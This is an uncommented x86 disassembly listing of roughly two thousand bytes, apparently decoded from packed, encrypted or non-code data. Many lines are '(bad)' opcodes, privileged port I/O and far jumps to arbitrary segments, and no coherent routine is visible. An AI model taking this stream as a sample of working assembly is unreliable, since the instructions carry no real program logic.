  41166f:	xor    dh,BYTE PTR [ecx+edi*1-0x66]
  411673:	push   esi
  411674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411675:	sub    BYTE PTR [edi+0x79],0xd8
  411679:	xor    eax,0x2dfaad6e
  41167e:	dec    ebx
  41167f:	inc    edi
  411680:	popa   
  411681:	(bad)  
  411682:	push   0xffffff81
  411684:	dec    esp
  411685:	or     eax,0xb433cd8
  41168a:	fwait
  41168b:	mov    DWORD PTR [edi+0x14],0x9caefbaf
  411692:	rcl    BYTE PTR ds:0x765955a8,1
  411698:	jmp    0x4116d1
  41169a:	outs   dx,DWORD PTR ds:[esi]
  41169b:	retf   
  41169c:	ins    DWORD PTR es:[edi],dx
  41169d:	scas   eax,DWORD PTR es:[edi]
  41169e:	dec    edx
  41169f:	sub    eax,0xb5efef37
  4116a4:	cmc    
  4116a5:	imul   eax,esi,0x9e661d6c
  4116ab:	sub    ah,ch
  4116ad:	or     BYTE PTR [ebx+0x10],0x6d
  4116b1:	xchg   ecx,eax
  4116b2:	inc    eax
  4116b3:	or     eax,0xe7615bb1
  4116b8:	push   esi
  4116b9:	mov    WORD PTR [eax],?
  4116bb:	mov    esp,0x9f0f368d
  4116c0:	or     eax,0xd16a7f8c
  4116c5:	inc    eax
  4116c6:	pop    ebx
  4116c7:	ficomp DWORD PTR [ecx-0x74]
  4116ca:	or     BYTE PTR [edi],al
  4116cc:	ror    ecx,1
  4116ce:	out    0xbd,al
  4116d0:	(bad)  
  4116d1:	fdivr  QWORD PTR [edx+ebp*2]
  4116d4:	daa    
  4116d5:	jmp    0xb212:0x7dcd065d
  4116dc:	mov    ch,0x4
  4116de:	frstor [ecx+edx*4]
  4116e1:	xchg   edi,eax
  4116e2:	int    0x91
  4116e4:	iret   
  4116e5:	(bad)
  4116e9:	aad    0xe0
  4116eb:	ret    0x3dfd
  4116ee:	mov    ecx,ecx
  4116f0:	fst    QWORD PTR [esi+0x7d]
  4116f3:	out    0xa7,al
  4116f5:	pop    ss
  4116f6:	cmp    esp,DWORD PTR [eax-0x34adbcd8]
  4116fc:	sub    al,0xc7
  4116fe:	rol    BYTE PTR [ecx],1
  411700:	dec    edx
  411701:	inc    esp
  411702:	movlps QWORD PTR [edi],xmm0
  411705:	pop    esi
  411706:	add    eax,0x1eef7f8d
  41170b:	jae    0x411771
  41170d:	sub    esp,DWORD PTR [eax]
  41170f:	inc    esp
  411710:	push   ds
  411711:	push   edx
  411712:	dec    ebx
  411713:	xlat   BYTE PTR ds:[ebx]
  411715:	xor    al,0x70
  411717:	sbb    ebp,esi
  411719:	and    eax,0xa2dc2dc2
  41171e:	push   ecx
  41171f:	or     cl,bh
  411721:	add    DWORD PTR [ebx+0x5b081a9f],esi
  411727:	in     al,0xb0
  411729:	adc    eax,0xa066b422
  41172e:	cmc    
  41172f:	sbb    ah,BYTE PTR [esi]
  411731:	jmp    0x411715
  411733:	sbb    eax,0xa53a8fc
  411738:	add    BYTE PTR [edi-0x66],dh
  41173b:	sub    BYTE PTR [edi],ch
  41173d:	add    al,0x42
  41173f:	mov    eax,ds:0x9d0fd7ab
  411744:	(bad)  
  411745:	cli    
  411746:	mov    ch,0x81
  411748:	push   edi
  411749:	cmp    edi,0xf9bfac14
  41174f:	cdq    
  411750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411751:	and    bh,ch
  411753:	push   ss
  411754:	inc    edi
  411755:	inc    eax
  411756:	xchg   BYTE PTR [edx-0x649aed5b],al
  41175c:	outs   dx,DWORD PTR ds:[esi]
  41175d:	ja     0x411735
  41175f:	or     BYTE PTR [esi-0x5a],ch
  411762:	fcomp  QWORD PTR [eax+0x45]
  411765:	adc    DWORD PTR [ebx-0x102e38c3],esi
  41176b:	js     0x4117a5
  41176d:	imul   ecx,DWORD PTR [eiz*8-0x651450e0],0x347fcb3b
  411778:	nop
  411779:	sbb    eax,0x560556fa
  41177e:	pop    ecx
  41177f:	jecxz  0x41179d
  411781:	call   0x305f:0x12497bb8
  411788:	inc    ebx
  411789:	push   eax
  41178a:	mov    gs,WORD PTR [eax-0x1c]
  41178d:	cmp    eax,DWORD PTR [edx]
  41178f:	sbb    cl,BYTE PTR [esi]
  411791:	add    bl,BYTE PTR [eax-0x4ee58b2b]
  411797:	and    dh,BYTE PTR [eax-0x5356e69f]
  41179d:	push   0xab7441d3
  4117a2:	cdq    
  4117a3:	faddp  st(3),st
  4117a5:	push   es
  4117a6:	mov    ds:0x165e43af,eax
  4117ab:	mov    es,WORD PTR [ecx+0x68d436d7]
  4117b1:	and    eax,DWORD PTR [edx+0x61]
  4117b4:	mov    dl,BYTE PTR [eax+0x23c70a2]
  4117ba:	test   DWORD PTR [edi+eiz*8+0x71],esp
  4117be:	xchg   ebp,eax
  4117bf:	mov    edi,0x99fe31e3
  4117c4:	adc    al,0xb1
  4117c6:	or     al,0x7
  4117c8:	push   edi
  4117c9:	sub    esp,edx
  4117cb:	inc    esi
  4117cc:	mov    ch,0x6e
  4117ce:	or     BYTE PTR [ecx+0x40],dl
  4117d1:	mov    dl,0x8a
  4117d3:	dec    ebp
  4117d4:	and    al,0xb5
  4117d6:	mov    dl,ah
  4117d8:	pop    ds
  4117d9:	(bad)  
  4117da:	and    ch,BYTE PTR [ecx+0x519e6b96]
  4117e0:	popa   
  4117e1:	jmp    0x41177c
  4117e3:	push   cs
  4117e4:	(bad)  
  4117e5:	sbb    al,0x81
  4117e7:	mov    edi,?
  4117e9:	adc    BYTE PTR [eax+0x12],0x77
  4117ed:	stc    
  4117ee:	and    BYTE PTR [ebp+esi*8+0x2a],dh
  4117f2:	dec    ecx
  4117f3:	pusha  
  4117f4:	inc    ecx
  4117f5:	fnstsw WORD PTR [edi-0x60534bdc]
  4117fb:	ds je  0x411795
  4117fe:	ror    esp,cl
  411800:	in     al,dx
  411801:	mov    dh,0x5
  411803:	dec    eax
  411804:	push   edx
  411805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411806:	cmovg  ecx,eax
  411809:	out    dx,al
  41180a:	cmp    edi,ebp
  41180c:	fcomp  QWORD PTR [edx+0x18]
  41180f:	jecxz  0x4117df
  411811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411812:	pop    ebp
  411813:	jb     0x4117b2
  411815:	xchg   edx,eax
  411816:	je     0x41185b
  411818:	sahf   
  411819:	or     DWORD PTR [edi],eax
  41181b:	add    al,0x81
  41181d:	dec    esi
  41181e:	cmp    BYTE PTR [ecx],al
  411820:	cdq    
  411821:	out    0x3b,eax
  411823:	and    BYTE PTR [ebx],0x37
  411826:	imul   edx,edi,0x82fb03fe
  41182c:	lods   al,BYTE PTR ds:[esi]
  41182d:	jb     0x4118a2
  41182f:	setp   al
  411832:	outs   dx,DWORD PTR ds:[esi]
  411833:	jl     0x411871
  411835:	xor    DWORD PTR [ebp+0x2c],0x30
  411839:	shl    BYTE PTR [esp+eax*4],0xf6
  41183d:	jo     0x4118a3
  41183f:	dec    edi
  411840:	xor    cl,BYTE PTR [ecx]
  411842:	cdq    
  411843:	test   DWORD PTR [ecx+0x4b6a337b],edx
  411849:	stos   DWORD PTR es:[edi],eax
  41184a:	pop    edx
  41184b:	mov    al,0xff
  41184d:	mov    bl,0xb4
  41184f:	repnz (bad) 
  411851:	(bad)  
  411852:	in     al,0x23
  411854:	inc    esp
  411855:	pop    ecx
  411856:	inc    esi
  411857:	or     al,0x26
  411859:	iret   
  41185a:	jne    0x411817
  41185c:	pop    edx
  41185d:	cmp    DWORD PTR [eax-0x548364a5],ebx
  411863:	inc    esp
  411864:	push   ecx
  411865:	add    BYTE PTR [ecx+0x2e],al
  411868:	mov    WORD PTR [ebx+0x69],ss
  41186b:	xchg   esp,eax
  41186c:	cmc    
  41186d:	xchg   DWORD PTR [eax],eax
  41186f:	mov    BYTE PTR [eax+0xa],dh
  411872:	xor    BYTE PTR [ebx+0x76],0x6f
  411876:	es pop es
  411878:	dec    esp
  411879:	xchg   ebx,eax
  41187a:	adc    ch,cl
  41187c:	push   ebx
  41187d:	aad    0x26
  41187f:	test   eax,0xb5baa70d
  411884:	inc    ebp
  411885:	xor    DWORD PTR [ebp-0x80],ecx
  411888:	mov    es,edi
  41188a:	pop    eax
  41188b:	push   ecx
  41188c:	adc    DWORD PTR [edx+edx*4+0x4a],edx
  411890:	inc    ebx
  411891:	or     BYTE PTR [edx+edi*8+0xeb4e5aa],cl
  411898:	dec    ecx
  411899:	mov    esp,0xae320b73
  41189e:	mov    dh,0x23
  4118a0:	dec    ebp
  4118a1:	xor    al,0x32
  4118a3:	loope  0x41191e
  4118a5:	pop    edi
  4118a6:	dec    esp
  4118a7:	int3   
  4118a8:	and    dl,ch
  4118aa:	aad    0x59
  4118ac:	aad    0xb0
  4118ae:	xchg   edx,ecx
  4118b0:	pusha  
  4118b1:	inc    dl
  4118b3:	bound  esi,QWORD PTR [eax-0x69f60f82]
  4118b9:	sbb    BYTE PTR [ecx-0x64],dh
  4118bc:	and    DWORD PTR [ebx-0x2],eax
  4118bf:	jb     0x411859
  4118c1:	jne    0x411897
  4118c3:	imul   ecx,DWORD PTR [edx],0x37
  4118c6:	std    
  4118c7:	and    ecx,DWORD PTR [ebx+ebx*1]
  4118ca:	scas   al,BYTE PTR es:[edi]
  4118cb:	(bad)  
  4118cd:	cmp    BYTE PTR [ebp-0x6c],dh
  4118d0:	push   0xa
  4118d2:	ins    BYTE PTR es:[edi],dx
  4118d3:	out    0x7e,eax
  4118d5:	inc    ebp
  4118d6:	ins    BYTE PTR es:[edi],dx
  4118d7:	fdiv   st,st(0)
  4118d9:	xchg   esp,eax
  4118da:	xchg   ebp,eax
  4118db:	push   0x7f9496f8
  4118e0:	mov    edx,0x329b62e1
  4118e5:	(bad)  
  4118e6:	loope  0x4118df
  4118e8:	pop    ecx
  4118e9:	sub    edi,edx
  4118eb:	clc    
  4118ec:	inc    edx
  4118ed:	sbb    ebp,DWORD PTR [edi+0x6d6cf539]
  4118f3:	push   es
  4118f4:	jmp    0xf5eb0ded
  4118f9:	jle    0x41192f
  4118fb:	push   ds
  4118fc:	pop    ecx
  4118fd:	mov    ds:0x1f4189e8,al
  411902:	mov    eax,ds:0x617dc2
  411907:	idiv   DWORD PTR [ebp-0x34]
  41190a:	nop
  41190b:	or     al,0x8
  41190d:	(bad)  
  41190e:	adc    edx,edx
  411910:	cmp    al,0x3f
  411912:	fprem1 
  411914:	and    ebx,edx
  411916:	outs   dx,BYTE PTR ds:[esi]
  411917:	xchg   edi,eax
  411918:	scas   eax,DWORD PTR es:[edi]
  411919:	mov    ebx,0x8f81b207
  41191e:	push   ebp
  41191f:	adc    esp,DWORD PTR [ebp-0x51]
  411922:	fisttp QWORD PTR [ecx]
  411924:	lds    ecx,FWORD PTR [eax-0x63]
  411927:	popf   
  411928:	xor    al,0x1b
  41192a:	jb     0x4118e5
  41192c:	je     0x41197f
  41192e:	inc    ecx
  41192f:	sti    
  411930:	adc    bh,BYTE PTR [ecx+0x19]
  411933:	outs   dx,DWORD PTR ds:[esi]
  411934:	sbb    ebp,DWORD PTR [edx]
  411936:	in     eax,dx
  411937:	sbb    eax,0x9eac4fe1
  41193c:	hlt    
  41193d:	cwde   
  41193e:	test   BYTE PTR [ebx],0xb2
  411941:	lahf   
  411942:	inc    edx
  411943:	add    dh,BYTE PTR [esi+eax*4]
  411946:	ret    
  411947:	pop    ecx
  411948:	not    BYTE PTR [ebp-0x21665a55]
  41194e:	xchg   edx,eax
  41194f:	push   DWORD PTR [ebp+ecx*2-0x687849b8]
  411956:	stc    
  411957:	and    BYTE PTR [eax],0xbe
  41195a:	dec    esp
  41195b:	repz jae 0x411920
  41195e:	loope  0x411998
  411960:	add    BYTE PTR [edx-0x3e],0x32
  411964:	int    0xef
  411966:	push   DWORD PTR [eax-0xe]
  411969:	jbe    0x411906
  41196b:	out    dx,eax
  41196c:	xlat   BYTE PTR ds:[ebx]
  41196d:	pop    esi
  41196e:	rcl    BYTE PTR [eax],cl
  411970:	xchg   ebp,eax
  411971:	inc    ebx
  411972:	lock add edi,DWORD PTR [ebx]
  411975:	mov    ebp,0xd7e48ad1
  41197a:	cld    
  41197b:	or     DWORD PTR [edi-0x21],ecx
  41197e:	ficom  WORD PTR [eax]
  411980:	out    0x95,al
  411982:	cdq    
  411983:	dec    edi
  411984:	push   esp
  411985:	fs dec ebx
  411987:	call   0x6b44:0xe42cebf3
  41198e:	sub    esp,DWORD PTR [ebx-0x42]
  411991:	push   0x1ab712ff
  411996:	and    DWORD PTR [ebp+0x6472ca15],edi
  41199c:	inc    eax
  41199d:	ret    
  41199e:	or     eax,0x91504e
  4119a3:	(bad)
  4119a6:	push   ebx
  4119a7:	or     dh,BYTE PTR [esi-0x59]
  4119aa:	push   edi
  4119ab:	inc    esp
  4119ac:	nop
  4119ad:	pop    esp
  4119ae:	mov    ebx,0xca29b7f9
  4119b3:	out    dx,eax
  4119b4:	ret    0x7fc
  4119b7:	loope  0x411993
  4119b9:	inc    esi
  4119ba:	nop
  4119bb:	(bad)  
  4119bc:	mov    BYTE PTR [ecx+0x179568eb],cl
  4119c2:	mov    eax,0x36d52ac2
  4119c7:	fs push ebp
  4119c9:	pop    ds
  4119ca:	cmp    bh,BYTE PTR [edx-0x17]
  4119cd:	xlat   BYTE PTR ds:[ebx]
  4119ce:	ret    
  4119cf:	popf   
  4119d0:	mov    bh,0xd9
  4119d2:	jne    0x411a0c
  4119d4:	cld    
  4119d5:	neg    BYTE PTR ds:0xf5562cb1
  4119db:	cld    
  4119dc:	shl    BYTE PTR [ecx+eiz*8],1
  4119df:	sbb    bh,BYTE PTR [ebx+0xfd1ac2f]
  4119e5:	imul   esp,DWORD PTR [eax+0xf],0xa59b7675
  4119ec:	mov    ds:0xe4d7a15b,eax
  4119f1:	mov    ah,0xdd
  4119f3:	retf   
  4119f4:	rol    DWORD PTR [edx],1
  4119f6:	les    ebx,FWORD PTR [esi+eax*4]
  4119f9:	pop    esp
  4119fa:	pop    ss
  4119fb:	push   cs
  4119fc:	sbb    BYTE PTR [ecx],dh
  4119fe:	popa   
  4119ff:	pop    ecx
  411a00:	mov    ebp,0xfd20908c
  411a05:	push   0xe1d0918e
  411a0a:	inc    esi
  411a0b:	cmp    BYTE PTR [eax+ecx*8+0x291f46ee],bh
  411a12:	adc    al,0xdd
  411a14:	call   0xb6d085b7
  411a19:	sahf   
  411a1a:	mul    BYTE PTR [eax+0x1d]
  411a1d:	pushf  
  411a1e:	cmc    
  411a1f:	dec    DWORD PTR [edx+0x74ac2aa5]
  411a25:	pop    ss
  411a26:	mov    DWORD PTR [edx],edi
  411a28:	jecxz  0x411a23
  411a2a:	inc    edi
  411a2b:	or     eax,0x8f3a29f9
  411a30:	in     al,0x94
  411a32:	jbe    0x411a41
  411a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a35:	sub    eax,DWORD PTR [ebp-0x66]
  411a38:	push   esi
  411a39:	mov    dh,0x2c
  411a3b:	mov    dh,0xba
  411a3d:	enter  0xef53,0x6d
  411a41:	xchg   ebp,eax
  411a42:	(bad)  
  411a43:	jl     0x411a96
  411a45:	cmp    al,BYTE PTR [esi-0x10dc4ff3]
  411a4b:	mov    ebx,0x75b9a94
  411a50:	sbb    cl,bh
  411a52:	mov    bh,0x6e
  411a54:	out    0x5,eax
  411a56:	mov    dl,BYTE PTR fs:[edi]
  411a59:	push   0xffffffd3
  411a5b:	cmp    DWORD PTR [eax-0x6c0ef04],ecx
  411a61:	loopne 0x411a74
  411a63:	pmulhuw mm5,mm6
  411a66:	in     eax,dx
  411a67:	std    
  411a68:	or     BYTE PTR [eax+0x7dcd90fc],0x5f
  411a6f:	test   DWORD PTR [ecx],0x804a2432
  411a75:	shl    bl,cl
  411a77:	xor    DWORD PTR [ecx-0x696eed6],ebp
  411a7d:	xor    DWORD PTR [ecx+0x2],ecx
  411a80:	pushf  
  411a81:	add    dl,BYTE PTR [ebx]
  411a83:	inc    edi
  411a84:	mov    es,eax
  411a86:	stos   BYTE PTR es:[edi],al
  411a87:	dec    eax
  411a88:	(bad)  
  411a89:	or     edx,edi
  411a8b:	clc    
  411a8c:	fsubr  QWORD PTR [ebp+ebp*2-0x68]
  411a90:	or     BYTE PTR [ecx+0x3],0x85
  411a94:	push   esp
  411a95:	lds    ebx,FWORD PTR [esp+ebx*8+0x6b47f032]
  411a9c:	and    ebp,edi
  411a9e:	lds    esi,FWORD PTR [ebp+0x4d]
  411aa1:	xchg   edx,eax
  411aa2:	push   cs
  411aa3:	pop    ecx
  411aa4:	lahf   
  411aa5:	adc    eax,0x891c7475
  411aaa:	in     al,dx
  411aab:	push   ecx
  411aac:	push   ss
  411aad:	arpl   WORD PTR [ebx-0x4a584c51],ax
  411ab3:	daa    
  411ab4:	cld    
  411ab5:	lock jnp 0x411ad0
  411ab8:	pop    esi
  411ab9:	leave  
  411aba:	jne    0x411a81
  411abc:	frstor [edx-0x367d064b]
  411ac2:	test   BYTE PTR [esp+eax*2],bl
  411ac5:	push   cs
  411ac6:	mov    ch,cl
  411ac8:	adc    eax,0xa64f591d
  411acd:	jl     0x411b41
  411acf:	ja     0x411a5f
  411ad1:	push   ss
  411ad2:	ins    DWORD PTR es:[edi],dx
  411ad3:	cli    
  411ad4:	aam    0x7d
  411ad6:	out    dx,al
  411ad7:	ins    BYTE PTR es:[edi],dx
  411ad8:	(bad)  
  411ad9:	pop    ecx
  411ada:	push   ss
  411adb:	jae    0x411a79
  411add:	es out 0x49,al
  411ae0:	pop    ds
  411ae1:	imul   ebx,ebx,0x3a
  411ae4:	dec    ecx
  411ae5:	and    edx,DWORD PTR [edx+0x40569b5a]
  411aeb:	aad    0xc
  411aed:	retf   0xb614
  411af0:	outs   dx,DWORD PTR ds:[esi]
  411af1:	cmp    esi,0x16
  411af4:	aad    0xb7
  411af6:	fidiv  WORD PTR [eax+0x42]
  411af9:	test   al,0xa3
  411afb:	mov    eax,0xf3058849
  411b00:	jbe    0x411ae3
  411b02:	out    0x15,al
  411b04:	sub    cl,BYTE PTR [ebx+0x4]
  411b07:	sbb    eax,0x578135ce
  411b0c:	rcl    BYTE PTR [ebp-0x52],0xe
  411b10:	add    BYTE PTR [ecx-0x25],ch
  411b13:	test   eax,0x8494fe49
  411b18:	rcr    BYTE PTR [eax+0x7040687e],cl
  411b1e:	push   ebx
  411b1f:	pop    ds
  411b20:	dec    edx
  411b21:	mov    ebp,0x35494310
  411b26:	cmp    BYTE PTR [ecx+ebp*8+0x70],cl
  411b2a:	adc    BYTE PTR [ebp+0x44],bl
  411b2d:	push   eax
  411b2e:	mov    WORD PTR [ecx+ebx*4-0x73a61965],es
  411b35:	or     ebx,DWORD PTR [bx+si+0x6f]
  411b39:	push   eax
  411b3a:	pop    es
  411b3b:	lahf   
  411b3c:	pop    edi
  411b3d:	xor    eax,0x8a31e44
  411b42:	dec    ebx
  411b43:	loopne 0x411b67
  411b45:	dec    esi
  411b46:	out    dx,eax
  411b47:	sbb    ah,bh
  411b49:	adc    dl,ah
  411b4b:	and    DWORD PTR [esi+ebp*2+0x5630f66],ebx
  411b52:	jnp    0x411b59
  411b54:	cs jns 0x411bba
  411b57:	ja     0x411ad9
  411b59:	cli    
  411b5a:	mov    dl,0x28
  411b5c:	(bad)  
  411b5d:	and    al,0x6
  411b5f:	pop    esp
  411b60:	call   0x84b2:0x528cb61c
  411b67:	pop    ebx
  411b68:	cli    
  411b69:	jl     0x411b88
  411b6b:	ror    DWORD PTR [ecx+0x4a],0xc7
  411b6f:	mov    ecx,0xeaac3692
  411b74:	out    0x60,al
  411b76:	pop    ebx
  411b77:	or     BYTE PTR [edx+0x39],cl
  411b7a:	jno    0x411bb4
  411b7c:	pushf  
  411b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b7e:	inc    ebp
  411b7f:	loope  0x411b0c
  411b81:	or     dl,BYTE PTR [esi+0x64]
  411b84:	arpl   WORD PTR [ecx],dx
  411b86:	or     esi,esi
  411b88:	inc    ecx
  411b89:	popf   
  411b8a:	cmp    DWORD PTR [edx],ebp
  411b8c:	or     al,0xfe
  411b8e:	and    edx,DWORD PTR [eax]
  411b90:	sbb    dl,0x90
  411b93:	push   ecx
  411b94:	pop    ecx
  411b95:	cmp    bh,BYTE PTR cs:[edx-0x35380e7e]
  411b9c:	add    al,0x1d
  411b9e:	clc    
  411b9f:	pcmpeqd mm3,QWORD PTR [ebx+edi*2]
  411ba3:	sahf   
  411ba4:	push   edi
  411ba5:	nop
  411ba6:	std    
  411ba7:	jae    0x411b56
  411ba9:	nop
  411baa:	rcl    BYTE PTR [edx-0x372f8e0d],cl
  411bb0:	mov    eax,ds:0xd65b525f
  411bb5:	adc    eax,0x76373390
  411bba:	or     dl,ah
  411bbc:	adc    dl,ch
  411bbe:	mov    edx,0x912beffc
  411bc3:	adc    eax,0x368f7f72
  411bc8:	sbb    al,0xda
  411bca:	or     DWORD PTR [edi-0x27],ebp
  411bcd:	cmc    
  411bce:	and    eax,0x9359691e
  411bd3:	xor    DWORD PTR [esp+ecx*2],edx
  411bd6:	xlat   BYTE PTR ds:[ebx]
  411bd7:	push   0x3
  411bd9:	adc    cl,dh
  411bdb:	or     ebp,DWORD PTR [edx+0x22]
  411bde:	(bad)  
  411bdf:	jbe    0x411bb3
  411be1:	mov    ecx,0xddb9cf95
  411be6:	rcl    DWORD PTR [edi],cl
  411be8:	cld    
  411be9:	dec    eax
  411bea:	xor    al,0x51
  411bec:	dec    eax
  411bed:	cs mov esi,0x200e461
  411bf3:	call   0xb5ef:0xe8fb6285
  411bfa:	sahf   
  411bfb:	stos   BYTE PTR es:[edi],al
  411bfc:	pop    es
  411bfd:	js     0x411bca
  411bff:	pop    ecx
  411c00:	sbb    ebx,DWORD PTR [eax-0x5a308e62]
  411c06:	jmp    0x932d:0x967abfec
  411c0d:	mov    al,ds:0x882c9c51
  411c12:	imul   ebx,DWORD PTR [esi],0x47
  411c15:	pop    es
  411c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c17:	cmp    al,0xe5
  411c19:	lods   al,BYTE PTR ds:[esi]
  411c1a:	ins    BYTE PTR es:[edi],dx
  411c1b:	stos   DWORD PTR es:[edi],eax
  411c1c:	in     eax,0xcb
  411c1e:	je     0x411bad
  411c20:	lock ins BYTE PTR es:[edi],dx
  411c22:	leave  
  411c23:	cmp    al,0x75
  411c25:	out    dx,al
  411c26:	jbe    0x411c1e
  411c28:	cs jbe 0x411c13
  411c2b:	pushf  
  411c2c:	scas   eax,DWORD PTR es:[edi]
  411c2d:	dec    eax
  411c2e:	xchg   edi,eax
  411c2f:	loop   0x411c5d
  411c31:	loopne 0x411bb6
  411c33:	das    
  411c34:	call   0x438d5842
  411c39:	mov    ebp,0x2d04df
  411c3e:	lods   al,BYTE PTR ds:[esi]
  411c3f:	mov    edi,0xe55f8662
  411c44:	sti    
  411c45:	add    BYTE PTR [ebp+edx*8-0x7a],bh
  411c49:	fdivp  st(6),st
  411c4b:	mov    edx,0x5ff2395a
  411c50:	adc    DWORD PTR [edx],edx
  411c52:	push   eax
  411c53:	pop    edx
  411c54:	dec    ebx
  411c55:	add    eax,edx
  411c57:	dec    ebx
  411c58:	jmp    0x411c67
  411c5a:	xchg   edx,eax
  411c5b:	cdq    
  411c5c:	jbe    0x411cb9
  411c5e:	pushf  
  411c5f:	xor    eax,DWORD PTR [edi+edi*2]
  411c62:	in     eax,dx
  411c63:	inc    esi
  411c64:	sbb    cl,bl
  411c66:	mov    WORD PTR [eax-0x5a15f275],ss
  411c6c:	xlat   BYTE PTR ds:[ebx]
  411c6d:	dec    edx
  411c6e:	dec    eax
  411c6f:	sub    DWORD PTR [eax],ecx
  411c71:	stc    
  411c72:	jmp    0xf4d02c5a
  411c77:	shr    ebx,cl
  411c79:	jns    0x411c98
  411c7b:	sub    BYTE PTR [ebp+0x74],ah
  411c7e:	mov    ebp,0xcf257215
  411c83:	aaa    
  411c84:	mul    BYTE PTR [ebx+0xefbf9f5]
  411c8a:	out    dx,eax
  411c8b:	pushf  
  411c8c:	fcomp  DWORD PTR [esi+0x6d]
  411c8f:	popa   
  411c90:	mov    dl,0x9e
  411c92:	inc    esi
  411c93:	cmp    DWORD PTR [eax],ebx
  411c95:	add    al,0x76
  411c97:	mov    ch,0x62
  411c99:	(bad)  
  411c9a:	sub    eax,0x513b933c
  411c9f:	rcr    DWORD PTR [eax-0x9d9b24e],1
  411ca5:	daa    
  411ca6:	xchg   DWORD PTR [edi+0x77],esi
  411ca9:	xchg   edi,eax
  411caa:	adc    edx,DWORD PTR [esi+0xf]
  411cad:	sub    BYTE PTR [esi],cl
  411caf:	loope  0x411c9e
  411cb1:	cwde   
  411cb2:	or     eax,0xf9b45901
  411cb7:	mov    ebx,0x1e59d9fb
  411cbc:	jmp    0x411d0c
  411cbe:	push   esi
  411cbf:	pop    es
  411cc0:	mov    dl,0x88
  411cc2:	out    0x3c,eax
  411cc4:	mov    ds:0xaf5c2090,al
  411cc9:	and    BYTE PTR [edx+0x20],ch
  411ccc:	fisttp DWORD PTR ds:0x2ac8014f
  411cd2:	mov    al,0x2d
  411cd4:	jmp    0x2749:0x6042a400
  411cdb:	test   eax,0x70217a14
  411ce0:	mov    ds:0xef2f3547,eax
  411ce5:	add    al,cl
  411ce7:	lods   al,BYTE PTR ds:[esi]
  411ce8:	out    0x9b,eax
  411cea:	sub    BYTE PTR [ebx],al
  411cec:	fdiv   QWORD PTR [edi+eiz*2+0x5423e8df]
  411cf3:	loop   0x411d44
  411cf5:	push   ss
  411cf6:	jge    0x411d6a
  411cf8:	scas   eax,DWORD PTR es:[edi]
  411cf9:	pushf  
  411cfa:	cmp    BYTE PTR [eax-0x7f],dl
  411cfd:	sub    DWORD PTR [ebp+0x22fca138],eax
  411d03:	out    dx,al
  411d04:	fcomp  st(5)
  411d06:	retf   0x48d9
  411d09:	adc    eax,0x3bec6c9a
  411d0e:	and    eax,0xd8491607
  411d13:	imul   esi,DWORD PTR [edi+0x108b9c66],0xffffffe6
  411d1a:	(bad)  
  411d1b:	push   ebp
  411d1c:	or     BYTE PTR [edi],cl
  411d1e:	xchg   ecx,eax
  411d1f:	(bad)  
  411d20:	xor    bl,bh
  411d22:	xor    bl,al
  411d24:	mov    ebx,0x52671bff
  411d29:	pop    esi
  411d2a:	icebp  
  411d2b:	dec    esp
  411d2c:	data16 (bad) 
  411d2f:	xor    al,0xac
  411d31:	pop    esp
  411d32:	cli    
  411d33:	xor    eax,0x47c2c5ea
  411d38:	stos   DWORD PTR es:[edi],eax
  411d39:	mov    BYTE PTR [edx+0xf],ah
  411d3c:	rcr    DWORD PTR [edi],0x22
  411d3f:	inc    ebx
  411d40:	dec    esp
  411d41:	sahf   
  411d42:	outs   dx,DWORD PTR ds:[esi]
  411d43:	adc    BYTE PTR [ebx],bl
  411d45:	ret    0x460a
  411d48:	in     eax,dx
  411d49:	sbb    ebx,DWORD PTR [esi+0xfefe994]
  411d4f:	xchg   edi,eax
  411d50:	ss call 0xfbc92a8c
  411d56:	enter  0xcb56,0x58
  411d5a:	clc    
  411d5b:	(bad)
  411d5e:	pusha  
  411d5f:	jns    0x411cf8
  411d61:	sti    
  411d62:	daa    
  411d63:	repz dec di
  411d66:	sbb    bl,BYTE PTR [eax-0x1f]
  411d69:	push   eax
  411d6a:	and    eax,0x4b5a0bf7
  411d6f:	stos   BYTE PTR es:[edi],al
  411d70:	adc    ecx,DWORD PTR [edx-0x2f]
  411d73:	xchg   esp,eax
  411d74:	pop    edx
  411d75:	ret    
  411d76:	or     BYTE PTR [ebx+0x68],cl
  411d79:	mov    fs,eax
  411d7b:	ins    BYTE PTR es:[edi],dx
  411d7c:	or     DWORD PTR [edx],ebx
  411d7e:	mov    ds:0xb51a1ef7,al
  411d83:	xor    DWORD PTR [ebp-0x55],0xe0155291
  411d8a:	jmp    0xcccaa5e2
  411d8f:	add    edx,ecx
  411d91:	lahf   
  411d92:	aad    0x65
  411d94:	retf   0xd604
  411d97:	push   0xcd6c937b
  411d9c:	lods   eax,DWORD PTR ds:[esi]
  411d9d:	pop    ebx
  411d9e:	xor    BYTE PTR [ebp+0x770cc135],al
  411da4:	inc    esp
  411da5:	ret    0x7071
  411da8:	mov    ch,0x6
  411daa:	mov    ?,WORD PTR [eax-0x4f]
  411dad:	addr16 pop ds
  411daf:	sub    DWORD PTR fs:[ecx-0x21223a4a],esi
  411db6:	test   DWORD PTR [eax+0x7ee14584],0x2600a8c8
  411dc0:	sbb    DWORD PTR [ebx],esi
  411dc2:	les    edi,FWORD PTR [esi-0x5901ca82]
  411dc8:	pop    esi
  411dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dca:	fwait
  411dcb:	push   eax
  411dcc:	int3   
  411dcd:	jnp    0x411db0
  411dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dd0:	mov    bh,0x86
  411dd2:	test   al,0x16
  411dd4:	jnp    0x411d6b
  411dd6:	scas   al,BYTE PTR es:[edi]
  411dd7:	lods   al,BYTE PTR ds:[esi]
  411dd8:	dec    ecx
  411dd9:	inc    ebp
  411dda:	pop    ss
  411ddb:	jno    0x411db3
  411ddd:	lahf   
  411dde:	add    al,0x54
  411de0:	pusha  
  411de1:	mov    eax,ds:0x1707b4fc
  411de6:	sub    ebx,DWORD PTR [eax-0x62]
  411de9:	cs sahf 
  411deb:	dec    edi
  411dec:	mov    ds,WORD PTR [edi-0x70]
  411def:	add    eax,0x447745d4
  411df4:	mov    eax,0xe67cdf13
  411df9:	inc    eax
  411dfa:	cmp    eax,0xfd7310f1
  411dff:	sbb    DWORD PTR [edx+0x40],eax
